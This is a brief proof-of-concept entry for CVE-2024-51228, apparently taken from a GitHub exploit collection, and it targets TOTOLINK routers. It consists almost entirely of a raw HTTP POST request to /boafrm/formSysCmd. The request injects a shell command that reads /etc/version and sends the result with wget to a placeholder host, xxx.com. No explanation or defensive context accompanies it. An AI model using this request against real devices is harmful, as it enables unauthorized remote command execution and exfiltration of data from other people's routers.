# CVE_2024_51228

from: https://github.com/wy876/POC/blob/main/%E8%B7%AF%E7%94%B1%E5%99%A8/TOTOLINK%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-51228).md

product: TOTOLINK
```
POST /boafrm/formSysCmd HTTP/1.1
Host: {Target IP}:{Target Port}
User-Agent: curl/7.81.0
Accept: */*
Content-Length: <length>
Content-Type: application/x-www-form-urlencoded

sysCmd=a%3D%24(cat%20%2Fetc%2Fversion)%3Bwget%20http%3A%2F%2Fxxx.com%3A8080%2F%3Fa%3D%22%24a%22
```
